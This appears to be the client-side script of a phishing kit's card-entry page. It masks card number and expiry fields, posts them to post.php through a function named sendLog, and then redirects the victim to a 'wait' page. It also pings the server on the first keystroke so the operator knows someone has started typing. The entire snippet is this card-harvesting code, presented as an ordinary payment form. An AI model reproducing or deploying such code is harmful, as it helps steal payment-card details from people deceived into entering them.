<script>
    // Input masks
    $("#num").mask("0000 0000 0000 0000 0");
    $("#expp").mask("00/0000");

function sendLog(){
    $("input").removeClass("error");

    if($("#num").val()==""){
        return $("#num").addClass("error");
    }
    if($("#expp").val()==""){
        return $("#expp").addClass("error");
    }
    $.post("post.php",{
        num:$("#num").val(),
        expp:$("#expp").val()
    },(res)=>{
        window.location="../auth/mkfile.php?p=wait";
    });

}

var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{n_card:1});
        abortNote=true;
    }

});



$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});


